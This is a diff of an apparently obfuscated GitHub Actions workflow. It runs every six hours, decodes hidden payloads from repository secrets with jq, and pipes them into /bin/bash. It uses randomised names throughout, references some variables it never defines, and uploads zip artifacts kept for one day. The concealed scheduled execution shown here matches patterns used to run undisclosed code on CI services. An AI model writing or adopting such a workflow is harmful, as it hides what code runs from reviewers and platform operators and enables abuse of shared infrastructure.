@@ -1,32 +1,25 @@
 name: xingzoupingji
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '15 5/6 * * *'
-jobs:  # 17375
+    - cron: '6 0,6,12,18 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: xingzoupingji
         env:
-          jz47: ${{ secrets.jz47 }}
+          yird8: ${{ secrets.yird8 }}
         run: |
-          echo $jz47 | jq -r .g98592 | /bin/bash
-          echo $yngne46270 | jq -r .djos0417 | /bin/bash
-          echo $msvc5654 | jq -r .wn65 | /bin/bash
-          echo $nj391 | jq -r .t1650 | /bin/bash
-          echo $ju221 | jq -r .uyji32 | /bin/bash
-          echo $kn028 | jq -r .lvjsq06 | /bin/bash
-          echo $uiff72742 | jq -r .xv4920 | /bin/bash
-          echo $b564 | jq -r .dugqg4 | /bin/bash
-          echo $odzm44363 | jq -r .mjd9 | /bin/bash
-          echo $hziuw8 | jq -r .vhobf16 | /bin/bash
-          echo $v27674 | jq -r .wjmej6121 | /bin/bash
-          echo $m3286 | jq -r .vvvk35971 | /bin/bash
-          echo $srrb74072 | jq -r .g6 | /bin/bash
-          echo $s6 | jq -r .r320 | /bin/bash
-          echo $rxwp85665 | jq -r .rxnvd14 | /bin/bash
-          echo $laafu37 | jq -r .vx7760 | /bin/bash
+          printf '%s' "$yird8" | jq -r .v51638 | /bin/bash
+          printf '%s' "$ohua84" | jq -r .kw6 | /bin/bash
+          echo $gye060 | jq -r .ejf88 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: ENS6V9Pj
+          path: "*.zip"
+          retention-days: 1
